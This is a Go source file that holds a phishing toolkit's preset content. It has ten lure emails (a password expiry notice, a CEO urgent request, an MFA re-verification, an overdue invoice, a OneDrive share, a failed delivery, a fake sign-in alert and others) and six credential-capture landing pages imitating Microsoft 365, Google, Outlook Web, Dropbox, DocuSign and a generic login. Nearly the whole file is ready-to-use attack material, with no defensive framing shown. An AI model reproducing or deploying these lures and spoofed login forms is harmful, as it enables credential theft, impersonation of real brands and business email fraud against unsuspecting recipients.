package main

// emailTemplate holds a preset phishing email template.
type emailTemplate struct {
	Subject string
	HTML    string
}

var emailTemplates = map[string]emailTemplate{
	"password-reset": {
		Subject: "Action Required: Password Expiration Notice",
		HTML: `<html><body style="font-family:Arial,sans-serif;color:#333;max-width:600px;margin:0 auto;padding:20px;">
<p>Dear {{.FirstName}},</p>
<p>Your account password is set to expire in <b>24 hours</b>. To avoid any disruption to your access, please reset your password immediately.</p>
<p style="text-align:center;margin:30px 0;"><a href="{{.URL}}" style="background-color:#0066cc;color:#fff;padding:14px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold;">Reset Password Now</a></p>
<p style="font-size:13px;color:#666;">If you did not request this change, please contact IT support immediately at ext. 4500.</p>
<hr style="border:none;border-top:1px solid #eee;margin:24px 0;">
<p style="font-size:12px;color:#999;">IT Security Team<br>This is an automated message. Please do not reply.</p>
</body></html>`,
	},
	"it-helpdesk": {
		Subject: "IT Helpdesk: Urgent Account Verification Required",
		HTML: `<html><body style="font-family:Arial,sans-serif;color:#333;max-width:600px;margin:0 auto;padding:20px;">
<div style="background:#f8f9fa;border-left:4px solid #28a745;padding:16px;margin-bottom:20px;">
<strong>TICKET #{{.From}}-7291</strong> — Priority: High
</div>
<p>Hi {{.FirstName}},</p>
<p>We have detected unusual activity on your account originating from an unrecognized device. As a security measure, we need you to verify your identity by logging in through our secure verification portal.</p>
<p><strong>Details:</strong></p>
<ul>
<li>Account: {{.Email}}</li>
<li>Suspicious login: 2 failed attempts from IP 185.220.101.x</li>
<li>Time: Today, 03:14 AM UTC</li>
</ul>
<p style="text-align:center;margin:30px 0;"><a href="{{.URL}}" style="background-color:#28a745;color:#fff;padding:14px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold;">Verify My Account</a></p>
<p style="font-size:13px;color:#666;">This verification is mandatory and must be completed within 24 hours to avoid account suspension.</p>
<hr style="border:none;border-top:1px solid #eee;margin:24px 0;">
<p style="font-size:12px;color:#999;">IT Helpdesk — Internal Support Portal<br>Do not forward this email.</p>
</body></html>`,
	},
	"ceo-urgent": {
		Subject: "Urgent: Action Needed Before EOD",
		HTML: `<html><body style="font-family:Arial,sans-serif;color:#333;max-width:600px;margin:0 auto;padding:20px;">
<p>{{.FirstName}},</p>
<p>I need you to review and approve an important document before end of day. I'm in back-to-back meetings all afternoon and cannot handle this myself.</p>
<p>The board requested some changes to the Q4 projections and I need your sign-off before I can submit the final version tonight.</p>
<p style="text-align:center;margin:30px 0;"><a href="{{.URL}}" style="background-color:#dc3545;color:#fff;padding:14px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold;">Review Document</a></p>
<p>Please treat this as urgent. Let me know once you've reviewed it.</p>
<p>Thanks,<br><strong>David Chen</strong><br>Chief Executive Officer</p>
<p style="font-size:11px;color:#999;">Sent from my iPhone</p>
</body></html>`,
	},
	"mfa-verify": {
		Subject: "Multi-Factor Authentication: Verification Required",
		HTML: `<html><body style="font-family:Arial,sans-serif;color:#333;max-width:600px;margin:0 auto;padding:20px;">
<div style="text-align:center;margin-bottom:24px;">
<div style="display:inline-block;background:#6f42c1;color:#fff;width:48px;height:48px;line-height:48px;border-radius:50%;font-size:24px;">&#128274;</div>
</div>
<p>Dear {{.FirstName}},</p>
<p>As part of our organization-wide security upgrade, all employees are required to <strong>re-verify their multi-factor authentication settings</strong> by end of business today.</p>
<p>This is necessary due to our recent migration to the new identity provider. Your current MFA token will be invalidated after the deadline.</p>
<p style="text-align:center;margin:30px 0;"><a href="{{.URL}}" style="background-color:#6f42c1;color:#fff;padding:14px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold;">Verify MFA Settings</a></p>
<div style="background:#fff3cd;border:1px solid #ffc107;border-radius:4px;padding:12px;margin:20px 0;font-size:13px;">
<strong>&#9888; Important:</strong> Failure to complete verification will result in temporary loss of access to all company systems including email, VPN, and cloud applications.
</div>
<hr style="border:none;border-top:1px solid #eee;margin:24px 0;">
<p style="font-size:12px;color:#999;">Information Security Department<br>This message was sent to {{.Email}}</p>
</body></html>`,
	},
	"invoice-payment": {
		Subject: "Invoice #INV-2026-4871 — Payment Approval Required",
		HTML: `<html><body style="font-family:Arial,sans-serif;color:#333;max-width:600px;margin:0 auto;padding:20px;">
<div style="background:#fff;border:1px solid #ddd;border-radius:8px;padding:24px;">
<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:20px;">
<h2 style="margin:0;color:#333;">Invoice Approval</h2>
<span style="background:#dc3545;color:#fff;padding:4px 12px;border-radius:12px;font-size:12px;font-weight:bold;">OVERDUE</span>
</div>
<table style="width:100%;border-collapse:collapse;margin:16px 0;">
<tr><td style="padding:8px 0;color:#666;">Invoice Number:</td><td style="padding:8px 0;font-weight:bold;">INV-2026-4871</td></tr>
<tr><td style="padding:8px 0;color:#666;">Vendor:</td><td style="padding:8px 0;">CloudServe Technologies Ltd.</td></tr>
<tr><td style="padding:8px 0;color:#666;">Amount:</td><td style="padding:8px 0;font-weight:bold;color:#dc3545;">$12,450.00</td></tr>
<tr><td style="padding:8px 0;color:#666;">Due Date:</td><td style="padding:8px 0;">November 25, 2026 (3 days overdue)</td></tr>
</table>
<p>Hi {{.FirstName}},</p>
<p>This invoice requires your approval before we can process the payment. The vendor has flagged this as overdue and we risk a 5% late fee if not processed by EOD.</p>
<p style="text-align:center;margin:24px 0;"><a href="{{.URL}}" style="background-color:#0066cc;color:#fff;padding:14px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold;">Review & Approve Invoice</a></p>
</div>
<p style="font-size:12px;color:#999;margin-top:16px;">Finance Department — Accounts Payable<br>Questions? Reply to this email or call ext. 3200</p>
</body></html>`,
	},
	"shared-document": {
		Subject: "{{.From}} shared a document with you",
		HTML: `<html><body style="font-family:'Segoe UI',sans-serif;color:#333;max-width:600px;margin:0 auto;padding:20px;background:#f5f5f5;">
<div style="background:#fff;border-radius:8px;padding:32px;box-shadow:0 1px 3px rgba(0,0,0,.1);">
<div style="text-align:center;margin-bottom:24px;">
<img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iNCIgZmlsbD0iIzAwNzhkNCIvPjx0ZXh0IHg9IjIwIiB5PSIyNiIgdGV4dC1hbmNob3I9Im1pZGRsZSIgZmlsbD0id2hpdGUiIGZvbnQtc2l6ZT0iMTgiIGZvbnQtZmFtaWx5PSJzZWdvZSB1aSI+TzwvdGV4dD48L3N2Zz4=" alt="OneDrive" width="40">
</div>
<p style="text-align:center;font-size:14px;color:#666;">Sarah Mitchell (s.mitchell@company.com) has shared a file with you:</p>
<div style="background:#f0f6ff;border:1px solid #c8ddf5;border-radius:6px;padding:16px;margin:20px 0;text-align:center;">
<div style="font-size:28px;margin-bottom:8px;">&#128196;</div>
<p style="margin:0;font-weight:bold;">Q4_Budget_Review_FINAL.xlsx</p>
<p style="margin:4px 0 0;font-size:13px;color:#666;">Excel Spreadsheet — 2.4 MB</p>
</div>
<p style="text-align:center;"><a href="{{.URL}}" style="background-color:#0078d4;color:#fff;padding:12px 32px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:600;">Open Document</a></p>
<p style="font-size:12px;color:#999;text-align:center;margin-top:24px;">Microsoft OneDrive — This link will expire in 7 days</p>
</div>
</body></html>`,
	},
	"delivery-notification": {
		Subject: "Delivery Failed: Package requires rescheduling",
		HTML: `<html><body style="font-family:Arial,sans-serif;color:#333;max-width:600px;margin:0 auto;padding:20px;">
<div style="background:#4a2800;color:#fff;padding:16px 24px;border-radius:8px 8px 0 0;">
<strong style="font-size:18px;">&#128230; Delivery Update</strong>
</div>
<div style="border:1px solid #ddd;border-top:none;border-radius:0 0 8px 8px;padding:24px;">
<div style="background:#fff3cd;border-radius:4px;padding:12px;margin-bottom:20px;">
<strong>&#9888; Delivery attempt failed</strong> — Recipient not available
</div>
<table style="width:100%;margin:16px 0;">
<tr><td style="padding:6px 0;color:#666;">Tracking #:</td><td style="padding:6px 0;font-weight:bold;">1Z9R72E84290437625</td></tr>
<tr><td style="padding:6px 0;color:#666;">Shipper:</td><td style="padding:6px 0;">Amazon.com</td></tr>
<tr><td style="padding:6px 0;color:#666;">Attempt Date:</td><td style="padding:6px 0;">November 28, 2026 at 2:34 PM</td></tr>
<tr><td style="padding:6px 0;color:#666;">Status:</td><td style="padding:6px 0;color:#dc3545;font-weight:bold;">Held at facility</td></tr>
</table>
<p>Dear {{.FirstName}},</p>
<p>We attempted to deliver your package today but were unable to complete the delivery. Please reschedule or the package will be returned to sender after 5 business days.</p>
<p style="text-align:center;margin:24px 0;"><a href="{{.URL}}" style="background-color:#4a2800;color:#fff;padding:14px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold;">Reschedule Delivery</a></p>
</div>
</body></html>`,
	},
	"hr-policy-update": {
		Subject: "Action Required: New Company Policy — Review & Acknowledge",
		HTML: `<html><body style="font-family:Arial,sans-serif;color:#333;max-width:600px;margin:0 auto;padding:20px;">
<div style="border-bottom:3px solid #17a2b8;padding-bottom:12px;margin-bottom:20px;">
<h2 style="margin:0;color:#17a2b8;">Human Resources</h2>
<p style="margin:4px 0 0;font-size:13px;color:#666;">Policy Update Notification</p>
</div>
<p>Dear {{.FirstName}},</p>
<p>The company has updated the following policy effective <strong>December 1, 2026</strong>:</p>
<div style="background:#e8f4f8;border-radius:6px;padding:16px;margin:16px 0;">
<p style="margin:0;font-weight:bold;">&#128203; Remote Work & Hybrid Attendance Policy v3.2</p>
<p style="margin:8px 0 0;font-size:13px;">Key changes: mandatory in-office days updated, home office equipment allowance increased, VPN usage requirements revised.</p>
</div>
<p>All employees must review and acknowledge the updated policy by <strong>November 30, 2026</strong>. Failure to acknowledge may affect your benefits enrollment.</p>
<p style="text-align:center;margin:24px 0;"><a href="{{.URL}}" style="background-color:#17a2b8;color:#fff;padding:14px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold;">Review & Acknowledge</a></p>
<hr style="border:none;border-top:1px solid #eee;margin:24px 0;">
<p style="font-size:12px;color:#999;">HR Department — People & Culture<br>This notification was sent to all employees.</p>
</body></html>`,
	},
	"security-alert": {
		Subject: "Security Alert: Suspicious Sign-In Detected",
		HTML: `<html><body style="font-family:Arial,sans-serif;color:#333;max-width:600px;margin:0 auto;padding:20px;">
<div style="background:#dc3545;color:#fff;padding:16px 24px;border-radius:8px 8px 0 0;text-align:center;">
<h2 style="margin:0;">&#128680; Security Alert</h2>
</div>
<div style="border:1px solid #ddd;border-top:none;border-radius:0 0 8px 8px;padding:24px;">
<p>Dear {{.FirstName}},</p>
<p>We detected a sign-in to your account from an <strong>unrecognized location</strong>:</p>
<table style="width:100%;background:#f8f9fa;border-radius:6px;padding:4px;margin:16px 0;">
<tr><td style="padding:8px 12px;color:#666;">Location:</td><td style="padding:8px 12px;font-weight:bold;">Moscow, Russia</td></tr>
<tr><td style="padding:8px 12px;color:#666;">IP Address:</td><td style="padding:8px 12px;font-family:monospace;">185.220.101.47</td></tr>
<tr><td style="padding:8px 12px;color:#666;">Browser:</td><td style="padding:8px 12px;">Chrome 119 on Windows</td></tr>
<tr><td style="padding:8px 12px;color:#666;">Time:</td><td style="padding:8px 12px;">Nov 28, 2026 at 03:22 AM UTC</td></tr>
</table>
<p><strong>If this was you</strong>, you can safely ignore this email.</p>
<p><strong>If this wasn't you</strong>, your account may be compromised. Secure it immediately:</p>
<p style="text-align:center;margin:24px 0;"><a href="{{.URL}}" style="background-color:#dc3545;color:#fff;padding:14px 28px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold;">Secure My Account</a></p>
</div>
<p style="font-size:12px;color:#999;margin-top:16px;">Account Security — Automated Alert<br>Sent to {{.Email}}</p>
</body></html>`,
	},
	"calendar-invite": {
		Subject: "Meeting Invitation: Mandatory All-Hands — Dec 2, 2026",
		HTML: `<html><body style="font-family:'Segoe UI',sans-serif;color:#333;max-width:600px;margin:0 auto;padding:20px;">
<div style="border:1px solid #ddd;border-radius:8px;overflow:hidden;">
<div style="background:#0078d4;color:#fff;padding:16px 24px;">
<h3 style="margin:0;">&#128197; Calendar Invitation</h3>
</div>
<div style="padding:24px;">
<h2 style="margin:0 0 4px;">Mandatory All-Hands: 2027 Strategy & Restructuring</h2>
<p style="color:#666;margin:0 0 20px;">Organized by: CEO Office</p>
<table style="width:100%;margin:16px 0;">
<tr><td style="padding:8px 0;color:#666;width:100px;">&#128339; When:</td><td style="padding:8px 0;"><strong>December 2, 2026</strong> — 2:00 PM - 3:30 PM (EST)</td></tr>
<tr><td style="padding:8px 0;color:#666;">&#128205; Where:</td><td style="padding:8px 0;">Main Conference Room / Microsoft Teams</td></tr>
<tr><td style="padding:8px 0;color:#666;">&#128100; Required:</td><td style="padding:8px 0;">All departments</td></tr>
</table>
<div style="background:#f0f6ff;border-radius:6px;padding:16px;margin:16px 0;">
<p style="margin:0;font-size:14px;"><strong>Agenda:</strong> Important organizational updates, 2027 roadmap presentation, and Q&A with leadership. <em>Attendance is mandatory for all full-time employees.</em></p>
</div>
<div style="text-align:center;margin:24px 0;">
<a href="{{.URL}}" style="background-color:#28a745;color:#fff;padding:12px 32px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold;margin:0 8px;">&#10003; Accept</a>
<a href="{{.URL}}" style="background-color:#6c757d;color:#fff;padding:12px 32px;text-decoration:none;border-radius:4px;display:inline-block;font-weight:bold;margin:0 8px;">&#63; Tentative</a>
</div>
</div>
</div>
</body></html>`,
	},
}

// landingPage holds a preset credential capture page.
type landingPage struct {
	HTML string
}

var landingPages = map[string]landingPage{
	"generic-login": {
		HTML: `<html><head><title>Sign In</title>
<style>body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
.card{background:#fff;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.1);width:360px}
h2{text-align:center;margin-bottom:24px;color:#333}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;font-size:14px}
button{width:100%;padding:12px;background:#0066cc;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px;margin-top:16px}
button:hover{background:#0052a3}
.footer{text-align:center;margin-top:16px;font-size:12px;color:#999}
</style></head><body>
<div class="card"><h2>Sign In</h2>
<form method="POST"><input name="username" placeholder="Email address" type="email" required>
<input name="password" placeholder="Password" type="password">
<button type="submit">Sign In</button></form>
<div class="footer">Forgot password? Contact IT support</div>
</div>
</body></html>`,
	},
	"o365-login": {
		HTML: `<html><head><title>Sign in to your account</title>
<style>body{font-family:"Segoe UI",sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f2f2f2}
.card{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
.logo{font-size:20px;font-weight:600;margin-bottom:4px;display:flex;align-items:center;gap:8px}
.logo-icon{width:24px;height:24px;background:#f25022;display:inline-block;position:relative}
.logo-icon::before{content:"";position:absolute;right:0;width:11px;height:11px;background:#7fba00}
.logo-icon::after{content:"";position:absolute;bottom:0;width:11px;height:11px;background:#00a4ef}
.subtitle{font-size:15px;margin:16px 0 24px;color:#1b1b1b}
input{width:100%;padding:10px 8px;margin:0 0 16px;border:none;border-bottom:1px solid #666;outline:none;font-size:15px;box-sizing:border-box;background:transparent}
input:focus{border-bottom-color:#0067b8}
button{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;cursor:pointer;font-size:15px;margin-top:12px}
button:hover{background:#005a9e}
.links{margin-top:20px;font-size:13px}
.links a{color:#0067b8;text-decoration:none}
</style></head><body>
<div class="card">
<div class="logo"><span class="logo-icon"></span>Microsoft</div>
<div class="subtitle">Sign in</div>
<form method="POST">
<input name="username" placeholder="Email, phone, or Skype" type="text" required>
<input name="password" placeholder="Password" type="password">
<button type="submit">Sign in</button>
</form>
<div class="links"><a href="#">Can't access your account?</a></div>
</div>
</body></html>`,
	},
	"google-login": {
		HTML: `<html><head><title>Sign in - Google Accounts</title>
<style>body{font-family:"Google Sans","Roboto",Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#fff}
.card{border:1px solid #dadce0;border-radius:8px;padding:48px 40px;width:360px}
.logo{text-align:center;margin-bottom:16px}
.logo svg{width:75px;height:24px}
.title{text-align:center;font-size:24px;margin:0 0 8px;color:#202124;font-weight:400}
.subtitle{text-align:center;font-size:16px;margin:0 0 32px;color:#202124}
input{width:100%;padding:13px 15px;margin:0 0 24px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;outline:none}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}
.forgot{font-size:14px;color:#1a73e8;text-decoration:none;display:block;margin-bottom:32px}
.actions{display:flex;justify-content:space-between;align-items:center}
.create{font-size:14px;color:#1a73e8;text-decoration:none;font-weight:500}
button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;cursor:pointer;font-weight:500}
button:hover{background:#1557b0;box-shadow:0 1px 3px rgba(0,0,0,.2)}
</style></head><body>
<div class="card">
<div class="logo"><svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg"><text x="0" y="20" font-family="Google Sans,Arial" font-size="22" font-weight="500"><tspan fill="#4285F4">G</tspan><tspan fill="#EA4335">o</tspan><tspan fill="#FBBC05">o</tspan><tspan fill="#4285F4">g</tspan><tspan fill="#34A853">l</tspan><tspan fill="#EA4335">e</tspan></text></svg></div>
<h1 class="title">Sign in</h1>
<p class="subtitle">Use your Google Account</p>
<form method="POST">
<input name="username" placeholder="Email or phone" type="text" required>
<input name="password" placeholder="Enter your password" type="password">
<a class="forgot" href="#">Forgot password?</a>
<div class="actions">
<a class="create" href="#">Create account</a>
<button type="submit">Next</button>
</div>
</form>
</div>
</body></html>`,
	},
	"outlook-web": {
		HTML: `<html><head><title>Outlook Web App</title>
<style>body{font-family:"Segoe UI",sans-serif;margin:0;background:#004578;display:flex;justify-content:center;align-items:center;height:100vh}
.container{text-align:center}
.header{color:#fff;margin-bottom:24px}
.header h1{font-size:28px;font-weight:300;margin:0 0 4px}
.header p{font-size:14px;opacity:.8;margin:0}
.card{background:#fff;padding:36px;width:380px;border-radius:2px;box-shadow:0 2px 8px rgba(0,0,0,.3)}
.card h2{font-size:18px;font-weight:400;margin:0 0 24px;color:#333}
input{width:100%;padding:10px;margin:0 0 12px;border:1px solid #c8c8c8;font-size:14px;box-sizing:border-box}
input:focus{border-color:#0078d4;outline:none}
button{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;font-size:14px;cursor:pointer}
button:hover{background:#005a9e}
.check{text-align:left;margin:12px 0;font-size:13px;color:#333}
.check input{width:auto;margin-right:6px}
</style></head><body>
<div class="container">
<div class="header"><h1>Outlook</h1><p>Web App</p></div>
<div class="card">
<h2>Sign in to your mailbox</h2>
<form method="POST">
<input name="username" placeholder="Domain\user name or email" type="text" required>
<input name="password" placeholder="Password" type="password">
<div class="check"><label><input type="checkbox"> Keep me signed in</label></div>
<button type="submit">Sign in</button>
</form>
</div>
</div>
</body></html>`,
	},
	"dropbox-login": {
		HTML: `<html><head><title>Sign in - Dropbox</title>
<style>body{font-family:Atlas Grotesk Web,Arial,sans-serif;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#fff}
.card{width:380px;padding:40px}
.logo{text-align:center;margin-bottom:32px}
.logo-box{display:inline-block;width:40px;height:40px;background:#0061ff;position:relative}
.logo-box::before,.logo-box::after{content:"";position:absolute;width:0;height:0;border-style:solid}
h1{text-align:center;font-size:22px;font-weight:400;margin:0 0 32px}
input{width:100%;padding:14px;margin:0 0 16px;border:2px solid #d2d2d2;border-radius:8px;font-size:16px;box-sizing:border-box}
input:focus{border-color:#0061ff;outline:none}
button{width:100%;padding:14px;background:#0061ff;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;font-weight:500}
button:hover{background:#004dcc}
.divider{text-align:center;margin:20px 0;color:#999;font-size:13px}
.links{text-align:center;margin-top:20px;font-size:14px}
.links a{color:#0061ff;text-decoration:none}
</style></head><body>
<div class="card">
<div class="logo"><div class="logo-box"></div></div>
<h1>Sign in to Dropbox</h1>
<form method="POST">
<input name="username" placeholder="Email" type="email" required>
<input name="password" placeholder="Password" type="password">
<button type="submit">Sign in</button>
</form>
<div class="links"><a href="#">Forgot password?</a> &middot; <a href="#">Create an account</a></div>
</div>
</body></html>`,
	},
	"docusign-login": {
		HTML: `<html><head><title>DocuSign - Review Document</title>
<style>body{font-family:Arial,sans-serif;margin:0;background:#f4f4f4;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
.banner{background:#fff;width:100%;max-width:500px;border-radius:8px;box-shadow:0 1px 4px rgba(0,0,0,.15);overflow:hidden}
.top{background:#1a1a2e;padding:20px 32px;display:flex;align-items:center;gap:12px}
.top-logo{color:#fff;font-size:20px;font-weight:bold}
.top-logo span{color:#38b6ff}
.body-area{padding:32px}
.doc-info{background:#f9f9f9;border:1px solid #eee;border-radius:6px;padding:16px;margin-bottom:24px}
.doc-info p{margin:4px 0;font-size:14px;color:#555}
.doc-info .title{font-weight:bold;color:#333;font-size:16px}
h2{font-size:18px;margin:0 0 8px;color:#333}
.msg{font-size:14px;color:#666;margin-bottom:24px}
input{width:100%;padding:12px;margin:0 0 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;box-sizing:border-box}
button{width:100%;padding:14px;background:#4c00c7;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer;font-weight:bold}
button:hover{background:#3a0099}
.footer{font-size:11px;color:#999;text-align:center;margin-top:16px}
</style></head><body>
<div class="banner">
<div class="top"><div class="top-logo">Docu<span>Sign</span></div></div>
<div class="body-area">
<div class="doc-info">
<p class="title">NDA_Agreement_2026.pdf</p>
<p>Sent by: Legal Department</p>
<p>Expires: December 5, 2026</p>
</div>
<h2>Verify your identity</h2>
<p class="msg">For security, please sign in to view and sign this document.</p>
<form method="POST">
<input name="username" placeholder="Email address" type="email" required>
<input name="password" placeholder="Password" type="password">
<button type="submit">Review Document</button>
</form>
</div>
</div>
<div class="footer">Powered by DocuSign, Inc. &copy; 2026</div>
</body></html>`,
	},
}
